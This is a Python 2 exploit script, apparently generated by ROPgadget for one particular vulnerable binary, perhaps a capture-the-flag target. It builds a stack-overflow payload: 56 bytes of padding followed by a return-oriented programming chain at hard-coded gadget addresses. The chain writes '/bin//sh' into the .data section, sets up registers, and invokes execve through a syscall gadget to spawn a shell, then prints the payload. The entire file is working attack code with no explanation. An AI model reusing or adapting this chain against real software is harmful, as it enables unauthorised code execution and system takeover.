#!/usr/bin/env python2
	# execve generated by ROPgadget

from struct import pack


if True:	# Padding goes here
	p = 'A'*56

	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e0) # @ .data
	p += pack('<Q', 0x000000000040302c) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000401ece) # pop rdi ; ret
	p += pack('<Q', 0x00000000004cc0e0) # @ .data
	p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x000000000048ef5b) # pop rdx ; pop rbx ; ret
	p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000040120e) # syscall
	print(p)
